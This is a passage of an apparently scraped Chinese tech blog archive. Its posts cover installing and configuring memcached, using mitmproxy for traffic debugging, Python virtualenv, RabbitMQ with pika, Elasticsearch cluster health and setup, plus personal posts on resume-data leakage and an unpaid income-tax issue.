的协议简单，目前仅支持二进制和文本模式，你可以通过 Telnet 或 nc 等命令直接 操作 memcached。 二进制和文本模式的区别： 二进制：解码速度快，支持设置密码 文本模式：简单、稳定，不支持设置密码 支持 epoll/kqueue 异步 I/O 模型，使用 livevent 作为事件的处理通知机制 memcached 使用全内存缓存，效率高，其全部数据都存放于 memcached 事先分配好的内存中，无持久化存储设计。 当内存中的缓存数据容量达到服务启动时设定的内存值时候，就会自动使用 LRU 算法删除过期的缓存数据，也可以存放数据时对存储的数据设置过期时间，到期就被清除，其本身不健康数据过期，而是在访问的时候查看 key 的时间戳判断是否过期。 memcached 支持分布式集群，但是它没有 mysql 那样的主从复制，其分布式集群的不同服务器之间是互不通信的，节点独立，并且数据也不一样。比如 memcached 通过nginx的一致性 hash 算法进行负载均衡： http { upstream test { consistent_ hash $ request_ uri； server 127. 0. 0. 1： 11211 id= 1001 weight= 3； server 127. 0. 0. 1： 11212 id= 1002 weight= 10； server 127. 0. 0. 1： 11213 id= 1003 weight= 20； }web 端分布式的简单代码 &quot;memcached_ servers&quot; =&gt; array（ &apos;10. 4. 4. 4： 11211&apos;， &apos;10. 4. 4. 5： 11211&apos;， &apos;10. 4. 4. 6： 11211&apos;， ）memcached 是一套类似 C/S 模式机构的软件，在服务器启动 memcached 服务守护进程，可以指定监听本地 IP 端口 并发访问数、以及预分配内存。 内存管理机制 采用了如下机制 slab : 提前把大内存分配大小为 1MB 的若干 slab，然后针对每个 slab 进行小对象的填充，被称为 chunk，避免大佬重复的初始化和清理，减轻了内存管理的负担。这些 chunk 不会被释放而是会循环利用。当有新增数据对象时候，因为 memcached 保存着 slab 的内存空闲 chunk 的列表，可以直接将数据进行缓存。其解决了内存碎片化问题，但是无法高效利用内存 LRU 可以配置参数如下： volatile-lru：根据LRU算法生成的过期时间来删除 allkeys-lru ：根据LRU算法删除任何key volatile-random：根据过期设置来随机删除key allkeys-random：无差别随机删 volatile-ttl ： 根据最近过期时间来删除（辅以TTL） noeviction ： 永不过期，返回错误hash 多线程 采用 POSIX 线程模式 安装yum install libevent libevent-deve gcc make cmake wget -c http://file201503.oss-cn-shanghai.aliyuncs.com/memcached-1.5.6.tar.gz tar zxvf memcached-1.5.6.tar.gz ./configure --prefix=/usr/local/memcached如提示： checking for libevent directory... configure: error: libevent is required. You can get it from http://www.monkey.org/~provos/libevent/ If it&apos;s already installed, specify its path using --with-libevent=/dir/则 wget -c https://github.com/libevent/libevent/releases/download/release-2.1.8-stable/libevent-2.1.8-stable.tar.gz tar zxvf libevent-2.1.8-stable.tar.gz cd libevent-2.1.8-stable ./configure make make install然后切换到 memcached 目录 执行 ./configure --prefix=/usr/local/memcached --with-libevent=/usr/local/lib/ make make install 报错 [root@memcached memcached-1.5.6]# /usr/local/memcached/bin/memcached -h /usr/local/memcached/bin/memcached: error while loading shared libraries: libevent-2.1.so.6: cannot open shared object file: No such file or directory先使用 [root@memcached lib]# whereis libevent libevent: /usr/local/lib/libevent.a /usr/local/lib/libevent.la /usr/local/lib/libevent.so然后查看 memcached 依赖路径 LD_DEBUG=libs /usr/local/memcached/bin/memcached -v得到如下结果 [root@memcached lib]# LD_DEBUG=libs /usr/local/memcached/bin/memcached -v 54068: find library=libevent-2.1.so.6 [0]; searching 54068: search cache=/etc/ld.so.cache 54068: search path=/lib64/tls/x86_64:/lib64/tls:/lib64/x86_64:/lib64:/usr/lib64/tls/x86_64:/usr/lib64/tls:/usr/lib64/x86_64:/usr/lib64 (system search path) 54068: trying file=/lib64/tls/x86_64/libevent-2.1.so.6 54068: trying file=/lib64/tls/libevent-2.1.so.6 54068: trying file=/lib64/x86_64/libevent-2.1.so.6 54068: trying file=/lib64/libevent-2.1.so.6 54068: trying file=/usr/lib64/tls/x86_64/libevent-2.1.so.6 54068: trying file=/usr/lib64/tls/libevent-2.1.so.6 54068: trying file=/usr/lib64/x86_64/libevent-2.1.so.6 54068: trying file=/usr/lib64/libevent-2.1.so.6 54068: /usr/local/memcached/bin/memcached: error while loading shared libraries: libevent-2.1.so.6: cannot open shared object file: No such file or directory执行 sudo ln -s /usr/local/lib/libevent-2.1.so.6 /usr/lib64/再次执行即可 [root@memcached lib]# /usr/local/memcached/bin/memcached -h memcached 1.5.6 -p, --port=&lt;num&gt; TCP port to listen on (default: 11211) -U, --udp-port=&lt;num&gt; UDP port to listen on (default: 11211, 0 is off) -s, --unix-socket=&lt;file&gt; UNIX socket to listen on (disables network support) -A, --enable-shutdown enable ascii &quot;shutdown&quot; command -a, --unix-mask=&lt;mask&gt; access mask for UNIX socket, in octal (default: 0700) -l, --listen=&lt;addr&gt; interface to listen on (default: INADDR_ANY) -d, --daemon run as a daemon -r, --enable-coredumps maximize core file limit -u, --user=&lt;user&gt; assume identity of &lt;username&gt; (only when run as root) -m, --memory-limit=&lt;num&gt; item memory in megabytes (default: 64 MB) -M, --disable-evictions return error on memory exhausted instead of evicting -c, --conn-limit=&lt;num&gt; max simultaneous connections (default: 1024) -k, --lock-memory lock down all paged memory -v, --verbose verbose (print errors/warnings while in event loop) -vv very verbose (also print client commands/responses) -vvv extremely verbose (internal state transitions) -h, --help print this help and exit -i, --license print memcached and libevent license -V, --version print version and exit -P, --pidfile=&lt;file&gt; save PID in &lt;file&gt;, only used with -d option -f, --slab-growth-factor=&lt;num&gt; chunk size growth factor (default: 1.25) -n, --slab-min-size=&lt;bytes&gt; min space used for key+value+flags (default: 48) -L, --enable-largepages try to use large memory pages (if available) -D &lt;char&gt; Use &lt;char&gt; as the delimiter between key prefixes and IDs. This is used for per-prefix stats reporting. The default is &quot;:&quot; (colon). If this option is specified, stats collection is turned on automatically; if not, then it may be turned on by sending the &quot;stats detail on&quot; command to the server. -t, --threads=&lt;num&gt; number of threads to use (default: 4) -R, --max-reqs-per-event maximum number of requests per event, limits the requests processed per connection to prevent starvation (default: 20) -C, --disable-cas disable use of CAS -b, --listen-backlog=&lt;num&gt; set the backlog queue limit (default: 1024) -B, --protocol=&lt;name&gt; protocol - one of ascii, binary, or auto (default) -I, --max-item-size=&lt;num&gt; adjusts max item size (default: 1mb, min: 1k, max: 128m) -F, --disable-flush-all disable flush_all command -X, --disable-dumping disable stats cachedump and lru_crawler metadump -o, --extended comma separated list of extended options most options have a &apos;no_&apos; prefix to disable - maxconns_fast: immediately close new connections after limit - hashpower: an integer multiplier for how large the hash table should be. normally grows at runtime. set based on &quot;STAT hash_power_level&quot; - tail_repair_time: time in seconds for how long to wait before forcefully killing LRU tail item. disabled by default; very dangerous option. - hash_algorithm: the hash table algorithm default is murmur3 hash. options: jenkins, murmur3 - lru_crawler: enable LRU Crawler background thread - lru_crawler_sleep: microseconds to sleep between items default is 100. - lru_crawler_tocrawl: max items to crawl per slab per run default is 0 (unlimited) - lru_maintainer: enable new LRU system + background thread - hot_lru_pct: pct of slab memory to reserve for hot lru. (requires lru_maintainer) - warm_lru_pct: pct of slab memory to reserve for warm lru. (requires lru_maintainer) - hot_max_factor: items idle &gt; cold lru age * drop from hot lru. - warm_max_factor: items idle &gt; cold lru age * this drop from warm. - temporary_ttl: TTL&apos;s below get separate LRU, can&apos;t be evicted. (requires lru_maintainer) - idle_timeout: timeout for idle connections - slab_chunk_max: (EXPERIMENTAL) maximum slab size. use extreme care. - watcher_logbuf_size: size in kilobytes of per-watcher write buffer. - worker_logbuf_size: size in kilobytes of per-worker-thread buffer read by background thread, then written to watchers. - track_sizes: enable dynamic reports for &apos;stats sizes&apos; command. - no_inline_ascii_resp: save up to 24 bytes per item. small perf hit in ASCII, no perf difference in binary protocol. speeds up all sets. - no_hashexpand: disables hash table expansion (dangerous) - modern: enables options which will be default in future. currently: nothing - no_modern: uses defaults of previous major version (1.4.x)启动 [root@memcached lib]# /usr/local/memcached/bin/memcached -p 11211 -m 100m -vv -u root slab class 1: chunk size 96 perslab 10922 slab class 2: chunk size 120 perslab 8738 slab class 3: chunk size 152 perslab 6898 slab class 4: chunk size 192 perslab 5461 slab class 5: chunk size 240 perslab 4369 slab class 6: chunk size 304 perslab 3449 slab class 7: chunk size 384 perslab 2730 slab class 8: chunk size 480 perslab 2184 slab class 9: chunk size 600 perslab 1747其中 -p 指定端口 -m 指定预分配的内存大小 -vv 打印详细信息 -u 指定运行的用户 后台启动 /usr/local/memcached/bin/memcached -p 11211 -m 100m -d使用二进制模式启动 /usr/local/memcached/bin/memcached -p 11211 -m 100m -B binary 二进制协议支持接口 操作码 操作命令 备注 0x00 Get 0x01 Set 0x02 Add 0x03 Replace 0x04 Delete 0x05 Increment 0x06 Decrement 0x07 Quit 0x08 Flush 不支持 0x09 GetQ 0x0a No-op 0x0b Version 不支持 0x0c GetK 0x0d GetKQ 0x0e Append 0x0f Prepend 0x10 Stat 不支持 0x11 SetQ 0x12 AddQ 0x13 ReplaceQ 0x14 DeleteQ 0x15 IncrementQ 0x16 DecrementQ 0x17 QuitQ 0x18 FlushQ 不支持 0x19 AppendQ 0x1a PrependQ 0x1b Verbosity 不支持 0x1c Touch 0x1d GAT 0x1e GATQ 0x20 SASL list mechs 0x21 SASL Auth 0x22 SASL Step 文本协议支持接口 操作命令 备注 add append bget 同get cas decr delete flushall 不支持 get gets incr prepend quit replace set stats 不支持 verbosity 不支持 version 不支持 重要说明memcached 强烈不建议开放公网访问,因为 memcached 同时监听 UDP 和 TCP 端口，而 UDP 协议相比较于 TCP 是比较简单的，不对数据做校验和确认，并且由于 memcached 是针对内存进行操作，读写速度非常快，如果权限设置不当被不法分子利用就很容易发起 DDOS 攻击。 Python 操作 memcached1.安装库 pip3 install python-memcached2.连接操作 import memcache mc = memcache.Client([&apos;59.111.104.12:11211&apos;],debug=True) mc.set(&apos;name&apos;,&apos;python&apos;) ret =mc.get(&apos;name&apos;) print(ret)3.集群 mc = memcache.Client([(&apos;1.1.1.1:12000&apos;, 1), (&apos;1.1.1.2:12000&apos;, 2),(&apos;1.1.1.3:12000&apos;,3)])","categories":[],"tags":[{"name":"memcached","slug":"memcached","permalink":"https://awen.me/tags/memcached/"}]},{"title":"使用 mitmproxy","slug":"使用-mitmproxy","date":"2018-03-16T07:47:40.000Z","updated":"2021-02-26T06:05:29.306Z","comments":true,"path":"posts/869.html","link":"","permalink":"https://awen.me/posts/869.html","excerpt":"什么是 mitmproxymitmproxy是一款支持HTTP(S)的中间人代理工具。不同于Fiddler2，burpsuite等类似功能工具，mitmproxy可在终端下运行。mitmproxy使用Python开发，是辅助web开发&amp;测试，移动端调试，渗透测试的工具。","text":"什么是 mitmproxymitmproxy是一款支持HTTP(S)的中间人代理工具。不同于Fiddler2，burpsuite等类似功能工具，mitmproxy可在终端下运行。mitmproxy使用Python开发，是辅助web开发&amp;测试，移动端调试，渗透测试的工具。 官网: https://mitmproxy.org/ 安装mac 安装 brew install mitmproxy或 pip3 install mitmproxy说明mitmproxy 提供了3个命令 ： mitmdump ：纯命令行界面，类似 tcpdump mitmproxy ：命令行模式，类似 vim mitmweb ：带 web 界面的 mitmproxy直接执行 mitmproxy 会打开本机的8080端口 然后手机开启http 代理，设置完代理后访问 mitm.it 点击对应的图标安装证书并使系统信任该证书，安装证书是为了当请求 HTTPS 页面的内容也可以看到具体的请求头和响应头信息，然后访问页面 PC 端就会出现对应的请求信息了 按方向键上下键进入对应的 URL 内查看请求 响应等字段，按左右键切换，按 q 键返回主界面。 在请求列表界面按 i，在左下角会显示 Intercept filter:，要求输入过滤表达式，用于指示拦截哪些请求，此处的过滤表达式的语法同请求列表过滤表达式相同。 比如输入 baidu.com，则当请求到百度时候请求会被拦截并以橙色标识(颜色根据终端设置不一样会显示不一样) 请求拦截后可以编辑重新发送，也可以直接放行，比如进入到该请求的响应里面按 e 键设置一些参数 自定义端口和 IP 和端口 mitmproxy --listen-host 0.0.0.0 -p 8888mitmweb执行 mitmweb 后会打开浏览器 出现如图所示的对话框，当有请求时候则都会显示在这里 mitmdump默认执行 mitmdump 三个命令具体的参数都可以看帮助 --helpAPIfrom mitmproxy import http def request(flow: http.HTTPFlow): # redirect to different host if flow.request.pretty_host == &quot;example.com&quot;: flow.request.host = &quot;mitmproxy.org&quot; # answer from proxy elif flow.request.path.endswith(&quot;/brew&quot;): flow.response = http.HTTPResponse.make( 418, b&quot;I&apos;m a teapot&quot;, )python 的相关 exmaples 可以查看 GitHub 源码 比如说将所有请求头的 server 都改成 nginx from mitmproxy import http def response(flow: http.HTTPFlow) -&gt; None: flow.response.headers[&quot;newheader&quot;] = &quot;foo&quot;保存为 Python 文档后执行 mitmproxy -s xxx.py","categories":[],"tags":[{"name":"mitmproxy","slug":"mitmproxy","permalink":"https://awen.me/tags/mitmproxy/"}]},{"title":"Python 使用 virtualenv","slug":"Python-使用-virtualenv","date":"2018-03-15T07:26:25.000Z","updated":"2021-02-26T06:05:29.262Z","comments":true,"path":"posts/28646.html","link":"","permalink":"https://awen.me/posts/28646.html","excerpt":"为什么要使用 virtualenv我们使用 pip 安装 Python 库很方便，但是如果有不同的工程需要使用到不同的版本的 Python 版本和库，如果全局统一安装那么肯定会出现各种依赖和兼容问题。那么解决办法就是不同的工程之间相互隔离，A 工程的库只能 A 工程使用，这样就方便很多了，virtualenv 就是来解决这个问题的。","text":"为什么要使用 virtualenv我们使用 pip 安装 Python 库很方便，但是如果有不同的工程需要使用到不同的版本的 Python 版本和库，如果全局统一安装那么肯定会出现各种依赖和兼容问题。那么解决办法就是不同的工程之间相互隔离，A 工程的库只能 A 工程使用，这样就方便很多了，virtualenv 就是来解决这个问题的。 使用 pycharm 创建工程我这里使用 pycharm CE 版本，新建一个工程 选择 virtualenv，然后选择 Python 版本，然后创建工程 然后我们在项目左侧可以看到venv 的一个文件夹，这里面加载了你选择的 Python 版本以及一些基础的 Python 库 name 我们现在来新建一个Python 文件，导入 requests 库，发现提示没有这个库 那么我们需要安装这个库 直接在全局下安装是不行滴，我们需要进入到 venv 这个虚拟环境下，怎么进入呢？ 找到你的工程对应的目录，执行 source venv/bin/activate得到如图所示的结果就表示进入了该 venv 环境了 然后执行 pip3 install requests就可以了 退出执行 deactivate 其他工具安装 pip，以 Ubuntu 为例 apt install virtualenv或 pip3 install virtualenv然后创建一个目录后进入该目录 virtualenv --no-site-packages venv","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"你准备离职？其实 HR 可能早就知道了","slug":"你准备离职？其实HR-可能早就知道了","date":"2018-03-15T05:35:09.000Z","updated":"2021-02-26T06:05:29.301Z","comments":true,"path":"posts/35010.html","link":"","permalink":"https://awen.me/posts/35010.html","excerpt":"你可能偷偷的在招聘网站更新了简历，准备看看机会？其实你公司的 HR 可能看的一清二楚!","text":"你可能偷偷的在招聘网站更新了简历，准备看看机会？其实你公司的 HR 可能看的一清二楚! 你公司的只需要购买一种服务，就可以对即将要离职的员工进行预警，我尝试用我已经离职的单位名称试了试，发现最近3个月有23个人在招聘网站更新了简历。 这个系统可以精确的记录你什么时间更新了简历，更新了多少次，以及姓名、学历、学校等非常细的信息，但是需要认证(交钱)才给看具体信息，不然是打了马赛克的，不过只需要做点小手段就可以拿到他的信息了。 可以看到这些数据里面包含了非常详细的信息。 这背后其实是通过互联网爬虫技术爬取招聘网站的数据然后贩卖，这样的个人信息泄露实在是令人感到可怕。 线上你能说得上名字的招聘网站其实数据都泄露了。 如何避免1.简历尽可能隐藏一些真实信息，比如姓名，不要写真实姓名，写个X先生、X女生，用人单位给你电话了在告诉人你真实姓名。 2.不要在线填写简历，使用 PDF 文档 3.到对应公司网站查看照片信息投递简历 4.找猎头 5.内推 说到内推~~ 网易校招内推码: D30H306 身边有弟弟妹妹是2019届的小鲜肉要参加实习想来网易的可以点击这里查看自己喜欢的实习职位，填写内推码面筛选直接进入笔试。 另外想来网易的社招也可以找我内推~ 简历发我邮箱 hi@awen.me","categories":[],"tags":[{"name":"离职","slug":"离职","permalink":"https://awen.me/tags/%E7%A6%BB%E8%81%8C/"}]},{"title":"RabbitMQ 入门","slug":"RabbitMQ-入门","date":"2018-03-14T08:14:53.000Z","updated":"2021-02-26T06:05:29.264Z","comments":true,"path":"posts/26133.html","link":"","permalink":"https://awen.me/posts/26133.html","excerpt":"安装并配置 rabbitmq参考消息队列服务 RabbitMQ 安装 pikapip3 install pika","text":"安装并配置 rabbitmq参考消息队列服务 RabbitMQ 安装 pikapip3 install pika 生产者1.send.py import pika # 连接服务器 rabbit_username = &apos;&apos; rabbit_password = &apos;&apos; credentials = pika.PlainCredentials(rabbit_username,rabbit_password) connection = pika.BlockingConnection(pika.ConnectionParameters(host=&apos;10.173.32.59&apos;,port=&apos;5672&apos;,credentials=credentials)) # channel 是进行消息读写的通道 channel = connection.channel() # 第二步，创建一个名为 queue 的队列，然后把消息发送到这个队列 channel.queue_declare(queue=&apos;queue&apos;) # 第三步，现在可以发送消息，但是 RabbitMQ 不能直接把消息发送到队列，需要先发送到交换机，这里先使用默认交换机(exchange)，它使用一个空字符串表示，routing_key # 参数必须指定队列名称，这里为 queue channel.basic_publish(exchange=&apos;&apos;,routing_key=&apos;queue&apos;,body=&apos;hello world&apos;) print(&apos;send:send message ‘hello world&apos;) connection.close()执行后得到 send:send message ‘hello world消费者2.receive.py import pika # 先连接服务器 rabbit_username = &apos;&apos; rabbit_password = &apos;&apos; credentials = pika.PlainCredentials(rabbit_username,rabbit_password) connection = pika.BlockingConnection(pika.ConnectionParameters(host=&apos;10.173.32.59&apos;,port=&apos;5672&apos;,credentials=credentials)) channel = connection.channel() # 为确保队列存在，在执行一次 queue_declare 创建一个队列，我们可以多次运行该命令，但是只有一个队列会被创建 channel.queue_declare(queue=&apos;queue&apos;) # 第三步，定义一个回调函数，获得消息时，pika 哭调用这个回调函数来处理消息，该回调消息将打印到屏幕 def callback(ch,method,properties,body): print(&quot;receive: %r&quot; %(body,)) channel.basic_consume(callback,queue=&apos;queue&apos;,no_ack=True) print( &apos;Waiting for messages.&apos;) channel.start_consuming()执行得到 Waiting for messages. receive: b&apos;hello world&apos;该程序不会中断，我们修改生产者的代码中的 body 内容为’hello world1’ channel.basic_publish(exchange=&apos;&apos;,routing_key=&apos;queue&apos;,body=&apos;hello world1&apos;)然后执行后观察 receive.py 可以看到该程序收到了发送的内容。 现在登录 web 管理平台，可以看到当前的连接情况、channel、queue 等信息。 一些概念Broker:消息队列服务器实体 消息：每个消息都有一个路由键(routing key)的属性。就是一个简单的字符串。 connection：应用程序与broker的网络连接。 channel:几乎所有的操作都在channel中进行，channel是进行消息读写的通道。客户端可建立多个channel，每个channel代表一个会话任务。 交换机：接收消息，根据路由键转发消息到绑定的队列。 绑定：一个绑定就是基于路由键将交换机和队列连接起来的路由规则，所以交换机不过就是一个由绑定构成的路由表。 举例：一个具有路由键“key1”的消息要发送到两个队列，queueA和queueB。要做到这点就要建立两个绑定，每个绑定连接一个交换机和一个队列。两者都是由路由键“key1”触发，这种情况，交换机会复制一份消息并把它们分别发送到两个队列中。 队列：消息的容器，也是消息的终点。一个消息可投入一个或多个队列。消息一直在队列里面，等待消费者连接到这个队列将其取走。 交换机交换机用来接收消息，转发消息到绑定的队列，是rabbitMq中的核心。 交换机共有4种类型：direct，topic，headers和fanout。 为什么不创建一种交换机来处理所有类型的路由规则？因为每种规则匹配时的CPU开销是不同的，所以根据不同需求选择合适交换机。 Direct交换机：转发消息到routingKey指定队列（完全匹配，单播）routingKey与队列名完全匹配，如果一个队列绑定到交换机要求路由键为“dog”，则只转发routingkey标记为dog的消息，不会转发dog.puppy，也不会转发dog.guard等。 Topic交换机：按规则转发消息（最灵活，组播）Topic类型交换机通过模式匹配分配消息的routing-key属性。将路由键和某个模式进行匹配，此时队列需要绑定到一个模式上。 它将routing-key和binding-key的字符串切分成单词。这些单词之间用点隔开。它同样也会识别两个通配符：符号“#”和符号“”。#匹配0个或多个单词，匹配不多不少一个单词。 Fanout交换机：转发消息到所有绑定队列（最快，广播）fanout交换机不处理路由键，简单的将队列绑定到交换机上，每个发送到交换机的消息都会被转发到与该交换机绑定的所有队列上。 很像子网广播，每台子网内的主机都获得了一份复制的消息。Fanout交换机转发消息是最快的。 如果没有队列绑定在交换机上，则发送到该交换机上的消息会丢失。一个交换机可以绑定多个队列，一个队列可以被多个交换机绑定。还有一些其他类型的交换机类型，如header、failover、system等，现在在当前的RabbitMQ版本中均未实现。因为交换机是命名实体，声明一个已经存在的交换机，但是试图赋予不同类型是会导致错误。客户端需要删除这个已经存在的交换机，然后重新声明并且赋予新的类型。 交换机的属性： 持久性：如果启用，交换机将会在server重启前都有效。 自动删除：如果启用，那么交换机将会在其绑定的队列都被删掉之后删除自身。 惰性:如果没有声明交换机，那么在执行到使用的时候会导致异常，并不会主动声明。 队列的属性： 持久性：如果启用，队列将在Server服务重启前都有效。 自动删除：如果启用，那么队列将会在所有的消费者停止使用之后自动删除自身。 惰性：如果没有声明队列，那么在执行到使用的时候会导致异常，并不会主动声明。 排他性：如果启用，队列只能被声明它的消费者使用。","categories":[],"tags":[{"name":"rabbitmq","slug":"rabbitmq","permalink":"https://awen.me/tags/rabbitmq/"}]},{"title":"离职后留下的那些坑","slug":"离职后留下的那些坑","date":"2018-03-13T10:30:05.000Z","updated":"2021-02-26T06:05:29.348Z","comments":true,"path":"posts/9088.html","link":"","permalink":"https://awen.me/posts/9088.html","excerpt":"年初支付宝里看12万个税申报的说明，我发现我居然还有1656.45 元的未缴个税","text":"年初支付宝里看12万个税申报的说明，我发现我居然还有1656.45 元的未缴个税 当时我问了我感到疑惑，这每个月发完工资不都是公司代扣的个人所得税吗？怎么突然多出来了这么多。 今天有一个前同事在群里说这个事情，我又想起来了，这个玩意到底算什么？为什么会有这么多钱没缴。于是谷歌、百度搜了一番发现了一个关键词：同月取得多份薪资的需要合并计算个税。 于是我去杭州地税局官网打印了一份个人纳税信息证明 该证明中我发现我9月和10月都缴纳了2次个税。因为时间比较久了，我之前单位的工资条都是发单位的邮箱的，而我离职了也就没有收到，于是我找之前单位领导要了这2个月的工资条，然后计算一番发现我9月份有718.87元的个税未缴纳，10月份有937.58元没缴。 终于知道为啥欠了这笔钱了。 然后想着看看这笔钱不交行不行？当然不行啦！根据《个人所得税法》的规定： 第三十六条纳税义务人有下列情形之一的，应当按照规定到主管税务机关办理纳税申报： （一）年所得12万元以上的； （二）从中国境内两处或者两处以上取得工资、薪金所得的； （三）从中国境外取得所得的； （四）取得应纳税所得，没有扣缴义务人的； （五）国务院规定的其他情形。 于是我去地税局官网看看能不能在线缴费，尝试多次都不行，网站做的太烂了，不停提示我异常。 然而我并没有发现异常，而且即使提交了也无法在线缴费。 准备去地税局当面缴纳下试试。 所以啊！给各位提个醒，之前的博客中提过离职一定不要断了社保，现在要加一条，离职后一定要确认是不是同一个月领了2份工资。 我现在已经逾期好久了。根本不知道这个事情，也没短信通知什么的。 不缴有什么后果1.你敢欠国家钱？不是罚款就是入刑咯！这还用说？ 1、纳税人采取欺骗、隐瞒手段进行虚假纳税申报或者不申报，逃避 缴纳税款，数额在五万元以上并且占各税种应纳税总额百分之十以上，经税务机关依法下达追缴通知后，不补缴应纳税款、不缴纳滞纳 金或者不接受行政处罚的;2、纳税人五年内因逃避缴纳税款受过刑事处罚或者被税务机关给予 二次以上行政处罚，又逃避缴纳税款，数额在五万元以上并且占各税 种应纳税总额百分之十以上的;3、扣缴义务人采取欺骗、隐瞒手段，不缴或者少缴已扣、已收税款， 数额在五万元以上的。 不过如果你和我一样之前是不之情的情况下，补缴就可以了。 12366有问题打电话 12366 咨询吧 更新1.今天一大早没有坐班车，而是坐地铁先到滨江区税务局领个号子咨询，工作人员告诉我你网上缴费要先开通三方协议，也就是要和已经合作的银行开通缴款协议才能扣款，难怪我一直扣款不成功。 2.因为我已经逾期半年了，要按日息万分之五缴纳滞纳金，地税局的工作人员告诉我大概要缴纳七八十块钱的滞纳金，而如果通过支付宝缴款则不需要缴纳滞纳金，如果你支付宝工资税额未达到 12 万，可以想想你有没有其他的非工资收入啊！反正让金额满足12万能提交就行。 支付宝交完费会有个地税局的盖章 我也是经历了这件事情才知道原来离职后还有这么一个坑。","categories":[],"tags":[]},{"title":"Elasticsearch 集群出现 yellow 的问题分析","slug":"Elasticsearch-集群出现-yellow-的问题分析","date":"2018-03-12T14:00:20.000Z","updated":"2021-02-26T06:05:29.246Z","comments":true,"path":"posts/51419.html","link":"","permalink":"https://awen.me/posts/51419.html","excerpt":"查看集群健康状态，发现状态为 yellow，这说明有副本分配不正常，我们再看 unassigned_shards 为 1 ，则说明有一个分配还未分配","text":"查看集群健康状态，发现状态为 yellow，这说明有副本分配不正常，我们再看 unassigned_shards 为 1 ，则说明有一个分配还未分配 root@ubuntu:~# curl -X GET nes01-giio.nes.cn-east-1.internal:9200/_cluster/health?pretty { &quot;cluster_name&quot; : &quot;nes01&quot;, &quot;status&quot; : &quot;yellow&quot;, &quot;timed_out&quot; : false, &quot;number_of_nodes&quot; : 1, &quot;number_of_data_nodes&quot; : 1, &quot;active_primary_shards&quot; : 1, &quot;active_shards&quot; : 1, &quot;relocating_shards&quot; : 0, &quot;initializing_shards&quot; : 0, &quot;unassigned_shards&quot; : 1, &quot;delayed_unassigned_shards&quot; : 0, &quot;number_of_pending_tasks&quot; : 0, &quot;number_of_in_flight_fetch&quot; : 0, &quot;task_max_waiting_in_queue_millis&quot; : 0, &quot;active_shards_percent_as_number&quot; : 50.0 } 那么具体是那个索引下的分片呢？我们通过以下命令查看 root@ubuntu:~# curl -X GET nes01-giio.nes.cn-east-1.internal:9200/_cluster/health?level=indices | python -m json.tool % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 579 100 579 0 0 63361 0 --:--:-- --:--:-- --:--:-- 64333 { &quot;active_primary_shards&quot;: 1, &quot;active_shards&quot;: 1, &quot;active_shards_percent_as_number&quot;: 50.0, &quot;cluster_name&quot;: &quot;nes01&quot;, &quot;delayed_unassigned_shards&quot;: 0, &quot;indices&quot;: { &quot;.kibana&quot;: { &quot;active_primary_shards&quot;: 1, &quot;active_shards&quot;: 1, &quot;initializing_shards&quot;: 0, &quot;number_of_replicas&quot;: 1, &quot;number_of_shards&quot;: 1, &quot;relocating_shards&quot;: 0, &quot;status&quot;: &quot;yellow&quot;, &quot;unassigned_shards&quot;: 1 } }, &quot;initializing_shards&quot;: 0, &quot;number_of_data_nodes&quot;: 1, &quot;number_of_in_flight_fetch&quot;: 0, &quot;number_of_nodes&quot;: 1, &quot;number_of_pending_tasks&quot;: 0, &quot;relocating_shards&quot;: 0, &quot;status&quot;: &quot;yellow&quot;, &quot;task_max_waiting_in_queue_millis&quot;: 0, &quot;timed_out&quot;: false, &quot;unassigned_shards&quot;: 1 }这个参数会让 cluster-health API 在我们的集群信息里添加一个索引清单，以及有关每个索引的细节（状态、分片数、未分配分片数等等） 问题解决1.该问题后来查看是因为集群所在的网络之间通信的端口 9300 不通导致的机器无法同步分配，防火墙进行设置即可。","categories":[],"tags":[{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://awen.me/tags/elasticsearch/"}]},{"title":"Elasticsearch 集群搭建和集群原理","slug":"elasticsearch-集群搭建","date":"2018-03-12T01:00:45.000Z","updated":"2021-02-26T06:05:29.272Z","comments":true,"path":"posts/60632.html","link":"","permalink":"https://awen.me/posts/60632.html","excerpt":"环境1.操作系统：centos7.22.elasticsearch 版本：6.2.23.服务器信息","text":"环境1.操作系统：centos7.22.elasticsearch 版本：6.2.23.服务器信息 服务器 IP 角色 10.173.32.34 node-34 10.173.32.32 node-32 安装 Javayum -y install java安装 Elasticsearchrpm -ivh https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.2.2.rpm配置集群elasticsearch 工作原理elasticsearch 只要它的其他节点和第一个节点有同样的 cluster.name 配置，它就会自动发现集群并加入到其中。 但是在不同机器上启动节点的时候，为了加入到同一集群，你需要配置一个可连接到的单播主机列表，也就是配置文件中的： discovery.zen.ping.unicast.hosts:[&quot;host1&quot;，“host2”]Elasticsearch 默认被配置为使用单播发现，以防止节点无意中加入集群。只有在同一台机器上运行的节点才会自动组成集群。 使用单播，你可以为 Elasticsearch 提供一些它应该去尝试连接的节点列表。 当一个节点联系到单播列表中的成员时，它就会得到整个集群所有节点的状态，然后它会联系 master 节点，并加入集群。 启动过程当 ElasticSearch 的节点启动后，它会利用多播 (multicast) (或者单播，如果用户更改了配置) 寻找集群中的其它节点，并与之建立连接。这个过程如下图所示 在集群中，一个节点被选举成主节点 (master node) 。这个节点负责管理集群的状态，当群集的拓扑结构改变时把索引分片分派到相应的节点上。 从用户的角度来看，主节点在ElasticSearch中并没有占据着重要的地位，这与其它的系统(比如数据库系统)是不同的。实际上用户并不需要知道哪个节点是主节点；所有的操作需求可以分发到任意的节点，&gt;ElasticSearch内部会完成这些让用户感到不明觉历的工作。在必要的情况下，任何节点都可以并发地把查询子句分发到其它的节点，然后合并各个节点返回的查询结果。最后返回给用户一个完整的数据集。所有的这些工作都不需要经过主节点转发(节点之间通过P2P的方式通信)。 主节点会去读取集群状态信息；在必要的时候，会进行恢复工作。在这个阶段，主节点会去检查哪些分片可用，决定哪些分片作为主分片。处理完成后，集群就会转入到黄色状态。 10.173.32.34# cat /etc/elasticsearch/elasticsearch.yml | grep -v ^# cluster.name: awentest # 集群名称，必须一致 node.name: node-34 # 节点名称，必须不一致 path.data: /var/lib/elasticsearch path.logs: /var/log/elasticsearch bootstrap.memory_lock: false network.host: 0.0.0.0 http.port: 9200 discovery.zen.ping.unicast.hosts: [&quot;10.173.32.34&quot;, &quot;10.173.32.32&quot;] # 配置单播方式查找同一集群名称的集群 discovery.zen.minimum_master_nodes: 2 # 最小主节点数10.173.32.32# cat /etc/elasticsearch/elasticsearch.yml | grep -v ^# cluster.name: awentest # 集群名称， node.name: node-32 path.data: 